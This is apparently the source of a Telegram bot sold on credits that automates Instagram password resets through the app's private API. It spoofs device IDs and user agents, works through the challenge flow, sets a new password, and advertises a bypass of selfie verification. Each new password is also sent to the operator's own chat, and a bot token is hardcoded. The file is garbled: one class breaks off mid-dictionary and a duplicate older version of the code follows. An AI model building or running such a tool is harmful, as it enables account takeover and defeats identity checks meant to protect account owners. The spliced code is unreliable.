import os
import random
import string
import uuid
import time
import json
import re
from datetime import datetime, date
from threading import Thread
import requests

BOT_TOKEN = "7713202757:AAFv7sdX2HhNaRPaoEKAZ5-RZxWYpJ-89rw"
CHAT_ID = "7735158151"
BOT_USERNAME = "IgReset_RoBot"

# --- Startup video (sent once when bot starts) ---
STARTUP_VIDEO_URL = "https://t.me/sneuc/14"

# --- IMAGE sent when user types /start ---
STARTUP_IMAGE_URL = "https://t.me/sneuc/15"

# Force subscribe channels
FORCE_SUB_CHANNELS = ["xPythonTools", "Resphonic"]
ENABLE_FORCE_SUB = True

ADMIN_IDS = [7735158151, 987654321]
DB_FILE = "ueieieser_data.json"

session = requests.Session()
session.headers.update({
    "Connection": "keep-alive",
    "Accept-Encoding": "gzip, deflate"
})

# ---------- Database Functions ----------
def load_db():
    try:
        with open(DB_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

def migrate_user_data():
    db = load_db()
    updated = False
    for user_id, user_data in db.items():
        for key in ["referral_code", "referral_link", "total_referrals", "total_earned", "referred_by"]:
            if key in user_data:
                del user_data[key]
                updated = True
    if updated:
        save_db(db)
        print("✅ Database migrated successfully!")

def get_user_data(user_id):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str not in db:
        db[user_id_str] = {
            "credits": 2,
            "last_reset_date": str(date.today())
        }
        save_db(db)
    else:
        if db[user_id_str].get("last_reset_date") != str(date.today()):
            db[user_id_str]["credits"] = 2
            db[user_id_str]["last_reset_date"] = str(date.today())
            save_db(db)
    return db[user_id_str]

def update_user_credits(user_id, credits):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] = credits
        save_db(db)

def add_credits(user_id, amount):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] += amount
        save_db(db)
        return True
    return False

def deduct_credit(user_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] >= 1:
        user_data["credits"] -= 1
        update_user_credits(user_id, user_data["credits"])
        return True
    return False

# ---------- Force Subscribe ----------
def verify_user_subscription(user_id):
    if not ENABLE_FORCE_SUB:
        return True, None
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    return False, channel
            else:
                return False, channel
        except Exception:
            return False, channel
    return True, None

def send_subscription_required(chat_id, user_id, message_id=None):
    required_channels = []
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    required_channels.append(channel)
            else:
                required_channels.append(channel)
        except:
            required_channels.append(channel)
    if not required_channels:
        return True
    msg = f"""⚠️ <b>Jᴏɪɴ Cʜᴀɴɴᴇʟs Tᴏ Usᴇ Tʜᴇ Bᴏᴛ</b>

Aғᴛᴇʀ Jᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴛʜᴇ ᴠᴇʀɪғʏ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ 👇"""
    keyboard_buttons = []
    for ch in required_channels:
        keyboard_buttons.append([{"text": f"Jᴏɪɴ Cʜᴀɴɴᴇʟ", "url": f"https://t.me/{ch}"}])
    keyboard_buttons.append([{"text": "✅ Vᴇʀɪғʏ Sᴜʙsᴄʀɪᴘᴛɪᴏɴ", "callback_data": "verify_sub"}])
    keyboard_buttons.append([{"text": "🔄 Rᴇғʀᴇsʜ", "callback_data": "refresh_sub"}])
    keyboard = {"inline_keyboard": keyboard_buttons}
    if message_id:
        edit_photo_caption(chat_id, message_id, msg, keyboard)
    else:
        send_photo(chat_id, STARTUP_IMAGE_URL, caption=msg, reply_markup=keyboard)
    return False

# ---------- Telegram Helpers ----------
def send_message(chat_id, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": disable_web_page_preview}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except:
        return None

def send_photo(chat_id, photo_url, caption=None, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    payload = {
        "chat_id": chat_id,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Failed to send photo: {e}")
        return None

def edit_photo_caption(chat_id, message_id, caption, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageCaption"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "caption": caption,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except Exception as e:
        print(f"Failed to edit photo caption: {e}")
        return None

def send_video(chat_id, video_url, caption=None, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
    payload = {"chat_id": chat_id, "video": video_url, "caption": caption, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Failed to send video: {e}")
        return None

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"offset": offset, "timeout": 25}
    try:
        response = session.get(url, params=params, timeout=30)
        return response.json()
    except:
        return None

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        session.post(url, data=payload, timeout=5)
    except:
        pass

# ---------- Instagram Reset Functions ----------
def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = session.get(url, headers=headers, timeout=8)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return None
    except:
        return None

def reset_instagram_password(reset_link, progress_callback=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        if progress_callback:
            progress_callback(10, "Extracting reset token...")
        
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        if progress_callback:
            progress_callback(25, "Sending reset request...")
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        
        # Increased timeout + retry
        for attempt in range(3):
            try:
                r = session.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=15)
                break
            except:
                if attempt == 2:
                    raise
                time.sleep(2)

        if "user_id" not in r.text:
            return {"success": False, "error": f"Error in reset request: {r.text[:200]}"}

        if progress_callback:
            progress_callback(40, "Processing challenge...")
        
        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        if progress_callback:
            progress_callback(55, "Solving challenge...")
        
        r2 = session.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=15).text

        if progress_callback:
            progress_callback(70, "Setting new password...")
        
        # More robust parsing
        try:
            challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
        except IndexError:
            return {"success": False, "error": "Failed to parse challenge response"}

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        session.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=15)
        
        new_password = PASSWORD.split(":")[-1]
        if progress_callback:
            progress_callback(90, "Finalizing...")
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

# Keep the rest of your code exactly the same (process_reset_link_with_progress and everything below)
def process_reset_link_with_progress(chat_id, user_id, reset_link, menu_msg_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] < 1:
        msg = """❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs!</b>

Yᴏᴜ ɴᴇᴇᴅ 1 Cʀᴇᴅɪᴛ ᴛᴏ ʀᴇsᴇᴛ ᴀ ᴘᴀssᴡᴏʀᴅ.

💡 <b>Gᴇᴛ Mᴏʀᴇ Cʀᴇᴅɪᴛs :</b>
• Wᴀɪᴛ ғᴏʀ ᴅᴀɪʟʏ ʀᴇsᴇᴛ (2 Cʀᴇᴅɪᴛs ᴇᴀᴄʜ ᴅᴀʏ)

— Dᴍ @xYourKing Tᴏ Bᴜʏ Cʀᴇᴅɪᴛs
"""
        keyboard = {"inline_keyboard": [[{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]]}
        edit_photo_caption(chat_id, menu_msg_id, msg, keyboard)
        return
    deduct_credit(user_id)
    progress_msg = send_message(chat_id, "⚙️ <b>Processing...</b>\n0%")
    progress_msg_id = progress_msg["result"]["message_id"] if progress_msg else None
    def update_progress(percent, status_text):
        if progress_msg_id:
            filled = int(percent / 10)
            bar = "█" * filled + "░" * (10 - filled)
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                payload = {"chat_id": chat_id, "message_id": progress_msg_id, "text": f"⚙️ <b>Processing...</b>\n{percent}% {bar}\n└ 🔄 {status_text}", "parse_mode": "HTML"}
                session.post(url, data=payload, timeout=5)
            except:
                pass
    result = reset_instagram_password(reset_link, update_progress)
    if progress_msg_id:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            session.post(url, data={"chat_id": chat_id, "message_id": progress_msg_id})
        except:
            pass
    if result.get("success"):
        user_id_insta = result.get("user_id")
        new_password = result.get("password")
        username = id_user(user_id_insta)
        if username:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nUsᴇʀɴᴀᴍᴇ : <code>{username}</code>\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🔄 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        else:
            msg = f"<b>Pᴀssᴡᴏʀᴅ Rᴇsᴇᴛ Dᴏɴᴇ</b>\n\nNᴇᴡ Pᴀssᴡᴏʀᴅ : <code>{new_password}</code>\n🔄 Sᴇssɪᴏɴ Iᴅ : <code>{user_id_insta}</code>"
        remaining = get_user_data(user_id)["credits"]
        msg += f"\n\n📊 Rᴇᴍᴀɪɴɪɴɢ Cʀᴇᴅɪᴛs : <b>{remaining}</b>"
        keyboard = {"inline_keyboard": [[{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]]}
        send_message(chat_id, msg, reply_markup=keyboard)
        send_telegram_message(f"🎯 Rᴇsᴇᴛ Dᴏɴᴇ\nUser: {user_id}\nPᴀssᴡᴏʀᴅ: {new_password}")
    else:
        add_credits(user_id, 1)
        msg = f"❌ <b>Rᴇsᴇᴛ Fᴀɪʟᴇᴅ!</b>\n\nError: {result.get('error', 'Unknown error')}\n\nYᴏᴜʀ Cʀᴇᴅɪᴛ ʜᴀs ʙᴇᴇɴ ʀᴇғᴜɴᴅᴇᴅ."
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 Tʀʏ Aɢᴀɪɴ", "callback_data": "send_reset_link"}],
                [{"text": "🔙 Bᴀᴄᴋ Tᴏ Mᴇɴᴜ", "callback_data": "back_to_menu"}]
            ]
        }
        send_message(chat_id, msg, reply_markup=keyboard)

# (The rest of your code - InstagramResetByEmail class, process_username_reset, menus, main loop, etc. remains unchanged)
# ... [All the remaining code from your original works.py stays exactly the same from here]

# ---------- Reset via Email/Username (with masked email display, no admin log) ----------
class InstagramResetByEmail:
    def __init__(self):
        self.SATAN = "567067343352428"
        self.YOURKING = "8c9c28282f690772f23fcf9061954c93eeec8c673d2ec49d860dabf5dea4ca27"
        self.PARITHINGS = {
            'User-Agent': "Instagram 312.0.0.33.119 Android (26/8.0.0; 480dpi; 2160x2160; Google; Pixel; sailfish; msm8996; en_US; 556997774)",
            'x-bloks-version-id': "8c9c28282f690772f23fcf9061954c93eeec8c673d2ec49d860dabf5dea4ca27",
            'x-fb-friendly-name': "IgApi: bloks/apps/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': "android-4f13595c1814df92",
            'x-ig-app-id': "567067343352428",
            'x-ig-device-id': "8deb1321-e663-40be-ada2-55325ca99b13",
            'x-ig-family-device-id': "eec97373-1959-5436-993e-c5e3472b3429",
            'x-mid': "bcPDkxACBBFRwdnT3iz2pKyVoO9b"
        }
        self.WLZTAN = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"

    def mask_email(self, email):
        """Return masked email like n******2@domain.com"""
        if '@' in email:
            local, domain = email.split('@', 1)
            if len(local) > 2:
                masked_local = local[0] + '*' * (len(local) - 2) + local[-1]
            else:
                masked_local = local[0] + '*'
            return f"{masked_local}@{domain}"
        return email

    def send_reset_request(self, search_input):
        url = self.WLZTAN
        payload = {
            'params': json.dumps({
                'client_input_params': {
                    'was_headers_prefill_available': 0,
                    'ig_vetted_device_nonce': '',
                    'cloud_trust_token': None,
                    'zero_balance_state': None,
                    'sso_accounts_auth_data': [],
                    'accounts_list': [
                        {'token': '', 'uid': '', 'credential_type': 'none'},
                        {'metadata': {'device_base_login_session': '', 'big_blue_token': None}, 'account_type': 'nonce', 'token': '', 'uid': ''},
                        {'account_type': 'google_oauth', 'token': ''}
                    ],
                    'ig_android_qe_device_id': '8deb1321-e663-40be-ada2-55325ca99b13',
                    'gms_incoming_call_retriever_eligibility': 'client_not_supported',
                    'headers_infra_flow_id': '',
                    'ig_oauth_token': [{'token': '', 'account_type': 'google_oauth'}],
                    'search_query': search_input,
                    'sfdid': '',
                    'flash_call_permissions_status': {'READ_PHONE_STATE': 'GRANTED', 'READ_CALL_LOG': 'DENIED', 'CALL_PHONE': 'UNKNOWN'},
                    'network_bssid': None,
                    'text_input_id': 'piwfmg:62',
                    'is_oauth_without_permission': 0,
                    'is_whatsapp_installed': 0,
                    'aac': '{"aac_init_timestamp":1774422796,"aacjid":"bc1f1830-62fd-5449-91ae-95ebfdab1288","aaccs":""}',
                    'fetched_email_token_list': {},
                    'android_build_type': 'release',
                    'fetched_email_list': [],
                    'was_headers_prefill_used': 0,
                    'auth_secure_device_id': '',
                    'search_screen_type': 'email_or_username',
                    'encrypted_msisdn': '',
                    'lois_settings': {'lois_token': ''},
                    'device_network_info': None
                },
                'server_params': {
                    'is_platform_login': 0,
                    'is_from_logged_out': 0,
                    'context_data': '',
                    'qe_device_id': '8deb1321-e663-40be-ada2-55325ca99b13',
                  if "referred_by" not in db[user_id_str]:
            db[user_id_str]["referred_by"] = None
            save_db(db)
    
    return db[user_id_str]

def update_user_credits(user_id, credits):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] = credits
        save_db(db)

def add_credits(user_id, amount):
    db = load_db()
    user_id_str = str(user_id)
    if user_id_str in db:
        db[user_id_str]["credits"] += amount
        db[user_id_str]["total_earned"] = db[user_id_str].get("total_earned", 0) + amount
        save_db(db)
        return True
    return False

def deduct_credit(user_id):
    user_data = get_user_data(user_id)
    if user_data["credits"] >= 1:
        user_data["credits"] -= 1
        update_user_credits(user_id, user_data["credits"])
        return True
    return False

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def verify_user_subscription(user_id):
    """Verify if user has joined all required channels"""
    if not ENABLE_FORCE_SUB:
        return True, None
    
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    return False, channel
            else:
                return False, channel
        except Exception:
            return False, channel
    
    return True, None

def edit_or_send(chat_id, text, message_id=None, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    """Edit existing message or send new one if no message_id"""
    if message_id:
        # Edit existing message
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        try:
            response = session.post(url, data=payload, timeout=5)
            return response.json()
        except:
            return None
    else:
        # Send new message
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        try:
            response = session.post(url, data=payload, timeout=5)
            return response.json()
        except:
            return None

def send_subscription_required(chat_id, user_id, message_id=None):
    """Send subscription required message with inline buttons"""
    required_channels = []
    for channel in FORCE_SUB_CHANNELS:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": f"@{channel}", "user_id": user_id}
        try:
            response = session.get(url, params=params, timeout=3)
            data = response.json()
            if data.get("ok"):
                status = data["result"].get("status", "")
                if status not in ["member", "administrator", "creator"]:
                    required_channels.append(channel)
            else:
                required_channels.append(channel)
        except:
            required_channels.append(channel)
    
    if not required_channels:
        return True
    
    channels_list = "\n".join([f"📢 <a href='https://t.me/{ch}'>{ch}</a>" for ch in required_channels])
    
    msg = f"""⚠️ <b>Jᴏɪɴ Cʜᴀɴɴᴇʟs Tᴏ Usᴇ Tʜᴇ Bᴏᴛ</b>

Aғᴛᴇʀ Jᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ ᴠᴇʀɪғʏ ⬇️"""

    keyboard_buttons = []
    for ch in required_channels:
        keyboard_buttons.append([{"text": f"Jᴏɪɴ Cʜᴀɴɴᴇʟ", "url": f"https://t.me/{ch}"}])
    
    keyboard_buttons.append([{"text": "✅ Vᴇʀɪғɪʏ Sᴜʙsᴄʀɪᴘᴛɪᴏɴ", "callback_data": "verify_sub"}])
    keyboard_buttons.append([{"text": "🔄 Rᴇғʀᴇsʜ", "callback_data": "refresh_sub"}])
    
    keyboard = {"inline_keyboard": keyboard_buttons}
    
    edit_or_send(chat_id, msg, message_id, keyboard, disable_web_page_preview=False)
    return False

def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = session.get(url, headers=headers, timeout=5)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return None
    except:
        return None

def reset_instagram_password(reset_link, progress_callback=None):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        
        if progress_callback:
            progress_callback(10, "Extracting reset token...")
        
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        if progress_callback:
            progress_callback(25, "Sending reset request...")
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        r = session.post(url, headers=make_headers(user_agent=USER_AGENT), data=data, timeout=10)
        
        if "user_id" not in r.text:
            return {"success": False, "error": f"Error in reset request: {r.text[:200]}"}

        if progress_callback:
            progress_callback(40, "Processing challenge...")
        
        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        if progress_callback:
            progress_callback(55, "Solving challenge...")
        
        r2 = session.post(url2, headers=make_headers(mid, USER_AGENT), data=data2, timeout=10).text
        
        if progress_callback:
            progress_callback(70, "Setting new password...")
        
        challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        session.post(url2, headers=make_headers(mid, USER_AGENT), data=data3, timeout=10)
        new_password = PASSWORD.split(":")[-1]
        
        if progress_callback:
            progress_callback(90, "Finalizing...")
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        session.post(url, data=payload, timeout=5)
    except:
        pass

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    params = {"offset": offset, "timeout": 25}
    try:
        response = session.get(url, params=params, timeout=30)
        return response.json()
    except:
        return None

def send_message(chat_id, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": disable_web_page_preview}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = session.post(url, data=payload, timeout=5)
        return response.json()
    except:
        return None

def send_start_menu(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    credits = user_data["credits"]
    referral_code = user_data["referral_code"]
    total_referrals = user_data.get("total_referrals", 0)
    
    msg = f"""<b>Wᴇʟᴄᴏᴍᴇ Tᴏ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bʏᴘᴀss Bᴏᴛ</b>

📊 <b>Your Stats:</b>
• 💎 Cʀᴇᴅɪᴛs : <code>{credits}</code>《 2 Fʀᴇᴇ Pᴇʀ Dᴀʏ 》
• 👥 Rᴇғғᴇʀᴀʟs : <code>{total_referrals}</code> users
• 💰 Tᴏᴛᴀʟ Pᴛs : <code>{user_data.get('total_earned', 0)}</code> Pᴛs

Cʜᴏᴏsᴇ Aɴ Oᴘᴛɪᴏɴ Tᴏ Pʀᴏᴄᴇᴇᴅ ⬇️
"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "𓁿Rᴇsᴇᴛ Bʏᴘᴀss", "callback_data": "send_reset_link"}],
            [{"text": "👥 Rᴇғғᴇʀᴀʟ Iɴғᴏ", "callback_data": "referral_info"}, {"text": "📊 Mʏ Sᴛᴀᴛs", "callback_data": "profile"}],
            [{"text": "❓ Hᴇʟᴘ & Sᴜᴘᴘᴏʀᴛ", "callback_data": "help"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_instruction_for_link(chat_id, message_id=None):
    msg = """Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Bʏᴘᴀss 

Wɪᴛʜ Tʜɪs Fᴇᴀᴛᴜʀᴇ, Yᴏᴜ Cᴀɴ 
ʙʏᴘᴀss Sᴇʟғɪᴇ Bᴇʀɪғɪᴄᴀᴛɪᴏɴ Bʏ Sᴇɴᴅɪɴɢ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ.

Pʟᴇᴀsᴇ Sᴇɴᴅ Yᴏᴜʀ Iɴsᴛᴀɢʀᴀᴍ Rᴇsᴇᴛ Lɪɴᴋ ⬇️"""
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]
        ]
    }
    
    return edit_or_send(chat_id, msg, message_id, keyboard)

def send_referral_info(chat_id, user_id, message_id=None):
    user_data = get_user_data(user_id)
    referral_link = user_data.get("referral_link", f"https://t.me/{BOT_USERNAME}?start=ref_{user_data['referral_code']}")
    total_referrals = user_data.get("total_referrals", 0)
    
    msg = f"""<b>👥 Rᴇғғᴇʀᴀʟ Pʀᴏɢʀᴀᴍ</b>

<b>Yᴏᴜʀ Rᴇғғᴇʀᴀʟ Iɴᴠɪᴛᴇ Lɪɴᴋ:</b>

<code>{referral_link}</code>

<b>📊 Yᴏᴜʀ Sᴛᴀᴛs :</b>
• 👥 Tᴏᴛᴀʟ Rᴇғғᴇʀᴀʟs : <code>{total_referrals}</code>
• 💎 Pᴛs Eᴀʀɴᴇᴅ : <code>{user_data.get('total_earned', 0)}</code>
• 💰 Cᴜʀʀᴇɴᴛ Pᴛs : <code>{user_data['credits']}</code>

<b>Hᴏᴡ Iᴛ Wᴏʀᴋs ❓:</b>
